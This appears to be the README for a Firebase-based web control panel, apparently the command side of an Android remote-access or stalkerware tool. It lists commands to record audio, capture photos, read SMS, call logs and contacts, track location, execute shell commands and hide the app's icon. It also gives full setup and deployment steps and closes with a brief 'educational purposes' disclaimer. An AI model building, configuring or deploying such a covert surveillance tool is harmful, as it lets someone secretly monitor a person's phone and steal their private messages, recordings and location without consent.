
# 🛡️ ERDMT Admin Panel

A fully functional web-based admin panel for managing Android devices remotely using Firebase. This static web application provides real-time device monitoring, command sending, log viewing, and media management capabilities.

## ✨ Features

### 🔐 Authentication
- Firebase email/password authentication
- Secure admin login with error handling
- Auto-redirect for authenticated users

### 📊 Dashboard
- Real-time device statistics
- Online device monitoring
- Recent activity feed
- Command history tracking
- Media file counts

### 📱 Device Management
- List all connected devices
- View device status (online/offline)
- Monitor battery levels and locations
- Send commands to specific devices
- Remove devices from the system

### 🎯 Command Center
- Send commands to individual devices or all devices
- Support for 9 different command types:
  - `mic_record` - Record audio
  - `camera_capture` - Take photos
  - `read_sms` - Read SMS messages
  - `read_call_logs` - Read call history
  - `read_contacts` - Read contact list
  - `list_installed_apps` - List installed apps
  - `get_location` - Get device location
  - `shell_exec` - Execute shell commands
  - `toggle_icon` - Hide/show app icon

### 📝 Logging System
- Real-time log viewing
- Search and filter logs
- Different log levels (info, warning, error, success)
- Clear logs functionality

### 🎵 Media Management
- View uploaded images and audio files
- Download media files
- Real-time media file updates
- Responsive media gallery

## 🚀 Setup Instructions

### 1. Firebase Configuration

1. **Create Firebase Project**
   - Go to [Firebase Console](https://console.firebase.google.com/)
   - Create a new project
   - Enable the following services:
     - Authentication (Email/Password provider)
     - Realtime Database
     - Storage

2. **Configure Authentication**
   - Go to Authentication > Sign-in method
   - Enable "Email/Password" provider
   - Add authorized domains if deploying to custom domain

3. **Set up Realtime Database**
   - Go to Realtime Database
   - Create database in test mode (or use custom rules)
   - Use the database rules below:

   ```json
   {
     "rules": {
       "devices": {
         ".read": "auth != null",
         ".write": "auth != null"
       },
       "commands": {
         ".read": "auth != null",
         ".write": "auth != null"
       },
       "responses": {
         ".read": "auth != null",
         ".write": true
       },
       "logs": {
         ".read": "auth != null",
         ".write": true
       }
     }
   }
   ```

4. **Configure Storage**
   - Go to Storage
   - Set up storage rules:

   ```javascript
   rules_version = '2';
   service firebase.storage {
     match /b/{bucket}/o {
       match /{allPaths=**} {
         allow read, write: if request.auth != null;
       }
     }
   }
   ```

5. **Get Firebase Config**
   - Go to Project Settings > General
   - Scroll down to "Your apps"
   - Click "Web" to add a web app
   - Copy the config object
   - Update `firebase-config.js` with your config

### 2. Update Firebase Configuration

Edit `firebase-config.js` with your Firebase project details:

```javascript
const firebaseConfig = {
  apiKey: "your-api-key",
  authDomain: "your-project.firebaseapp.com",
  databaseURL: "https://your-project-default-rtdb.firebaseio.com",
  projectId: "your-project-id",
  storageBucket: "your-project.appspot.com",
  messagingSenderId: "123456789",
  appId: "your-app-id",
  measurementId: "your-measurement-id"
};
```

### 3. Create Admin User

1. Go to Firebase Console > Authentication > Users
2. Click "Add user"
3. Enter email and password for admin account
4. Click "Add user"

### 4. Deploy the Admin Panel

#### Option A: Replit (Recommended)
1. Upload all files to your Replit project
2. Run the project
3. Access via the provided URL

#### Option B: Static Web Hosting
1. Upload the `admin-panel` folder to any web server
2. Ensure HTTPS is enabled (required for Firebase Auth)
3. Update Firebase authorized domains if necessary

#### Option C: Firebase Hosting
```bash
npm install -g firebase-tools
firebase login
firebase init hosting
firebase deploy
```

## 📱 Database Structure

The admin panel expects the following Firebase Realtime Database structure:

```json
{
  "devices": {
    "device_id": {
      "id": "device_id",
      "model": "Device Model",
      "online": true,
      "lastSeen": 1234567890,
      "battery": 85,
      "location": {
        "lat": 37.7749,
        "lng": -122.4194
      }
    }
  },
  "commands": {
    "device_id": {
      "command_id": {
        "type": "mic_record",
        "params": null,
        "timestamp": 1234567890,
        "sender": "admin@example.com",
        "status": "sent"
      }
    }
  },
  "responses": {
    "response_id": {
      "deviceId": "device_id",
      "commandId": "command_id",
      "message": "Command executed successfully",
      "success": true,
      "timestamp": 1234567890,
      "fileUrl": "https://storage.googleapis.com/...",
      "fileName": "audio_recording.mp3",
      "fileType": "audio/mpeg"
    }
  },
  "logs": {
    "log_id": {
      "deviceId": "device_id",
      "type": "command",
      "message": "Command sent to device",
      "level": "info",
      "timestamp": 1234567890
    }
  }
}
```

## 🎨 User Interface

### Navigation
- **Dashboard**: Overview and statistics
- **Devices**: Device management and status
- **Commands**: Send commands and view history
- **Logs**: System logs and activity
- **Media**: Uploaded files and media

### Responsive Design
- Desktop, tablet, and mobile friendly
- Bootstrap 5 framework
- Clean and modern interface
- Dark mode support (system preference)

### Real-time Updates
- Live device status updates
- Real-time command responses
- Automatic log updates
- Live media file additions

## 🔧 Troubleshooting

### Common Issues

**Firebase Connection Failed**
- Check `firebase-config.js` configuration
- Verify project ID and API keys
- Ensure all required Firebase services are enabled

**Authentication Error**
- Verify email/password provider is enabled
- Check if user exists in Firebase Auth
- Ensure authorized domains are configured

**Commands Not Working**
- Check Firebase Realtime Database rules
- Verify device is online and connected
- Check browser console for errors

**Media Files Not Loading**
- Verify Firebase Storage rules
- Check storage bucket configuration
- Ensure files are uploaded to correct paths

### Browser Requirements
- Modern browser with JavaScript enabled
- HTTPS connection (required for Firebase Auth)
- Local storage support
- WebSocket support for real-time updates

### Performance Tips
- Clear browser cache if experiencing issues
- Use modern browsers for best performance
- Ensure stable internet connection
- Monitor Firebase usage quotas

## 🔒 Security Considerations

- Always use HTTPS in production
- Implement proper Firebase security rules
- Use strong passwords for admin accounts
- Regularly update Firebase SDK versions
- Monitor Firebase usage and access logs
- Consider implementing additional authentication layers

## 📄 File Structure

```
admin-panel/
├── index.html          # Main dashboard page
├── login.html          # Authentication page
├── app.js             # Main application logic
├── styles.css         # Custom CSS styling
├── firebase-config.js # Firebase configuration
└── README.md          # This documentation
```

## 🤝 Contributing

This admin panel is part of the ERDMT project. To contribute:

1. Fork the repository
2. Create a feature branch
3. Make your changes
4. Test thoroughly
5. Submit a pull request

## 📞 Support

For support and questions:
- Check the troubleshooting section
- Review Firebase documentation
- Check browser console for errors
- Verify network connectivity

## 📝 License

This project is for educational and authorized administrative purposes only. Users are responsible for compliance with local laws and regulations regarding device monitoring and data privacy.

---

**Note**: This admin panel requires a corresponding Android application that integrates with the same Firebase project. Ensure both components are properly configured for full functionality.
